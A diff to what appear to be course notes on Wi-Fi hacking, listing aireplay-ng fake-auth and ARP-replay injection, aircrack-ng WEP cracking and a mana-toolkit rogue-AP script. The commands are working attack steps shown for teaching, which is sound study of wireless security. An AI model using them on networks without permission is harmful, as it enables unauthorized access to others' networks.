@@ -55,14 +55,15 @@ Here are the commands that will be used in the course
   * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 ## Crack WEP
 ### Busy Network
-* Start airodump-ng in the target
+* Start airodump-ng in the target network
 * Crack
   * `aircrack-ng <network-file>`
 ### NOT Busy Network
+* Associate with the target network (tell the network that I wnat to connect to it)
 * Fake Auth
-  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <your bssid || MAC> wlan0mon`
+  * `aireplay-ng --fakeauth 0 -a <network bssid> -h <your wireless adapter MAC> wlan0mon`
 * Packet Injection
-  * `aireplay-ng --arpreplay -b <network bssid> -h <your bssid || MAC> wlan0mon`
+  * `aireplay-ng --arpreplay -b <network bssid> -h <your wireless adapter MAC> wlan0mon`
 ## Crack WPA/WPA2
 ### With WPS
 * If wash is not working
